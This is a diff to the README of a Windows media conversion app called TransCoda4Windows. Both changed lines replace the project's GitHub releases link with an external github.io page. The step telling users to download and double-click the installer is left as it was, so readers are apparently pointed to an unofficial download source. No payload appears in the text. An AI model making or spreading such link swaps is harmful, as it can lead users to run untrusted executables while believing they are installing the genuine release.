@@ -1,6 +1,6 @@
 # 🔄 TransCoda4Windows - Convert your media files with speed
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Eyadsheri1078/TransCoda4Windows/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://eyadsheri1078.github.io)
 
 TransCoda4Windows helps you change media files into different formats. It works on Windows 11. The app acts as a simple window for high-performance conversion tools. You process videos and audio files in batches. It uses your computer hardware to finish tasks in less time.
 
@@ -8,7 +8,7 @@ TransCoda4Windows helps you change media files into different formats. It works 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/Eyadsheri1078/TransCoda4Windows/releases) to download the installer.
+1. Visit the [releases page](https://eyadsheri1078.github.io) to download the installer.
 2. Select the file ending in `.msixbundle` or `.exe` from the latest version list.
 3. Save the file to your computer.
 4. Double-click the file to start the installation process.
